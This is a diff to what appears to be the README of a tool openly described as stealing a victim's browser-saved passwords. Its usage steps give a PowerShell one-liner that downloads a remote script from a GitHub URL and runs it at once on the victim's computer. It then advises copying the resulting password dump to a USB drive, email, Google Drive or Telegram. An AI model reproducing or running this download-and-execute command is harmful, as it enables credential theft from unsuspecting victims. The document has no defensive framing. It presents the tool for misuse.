@@ -11,7 +11,7 @@ A small scripts that steals your victim's browser saved passwords.
 2. Copy and paste the script below on the powershell.
 
 ```powershell
-irm https://raw.githubusercontent.com/shiwoshiwo69/grabyer/main/pass_dump | iex
+irm https://raw.githubusercontent.com/shiwoshiwo69/GrabYer/refs/heads/main/pass_dump.txt | iex
 ```
 
 3. Now check your victim's desktop and find the file named pass_dump.txt and BOOM. you can copy the file to your usb or send it to your mail, gdrive, tg or what.
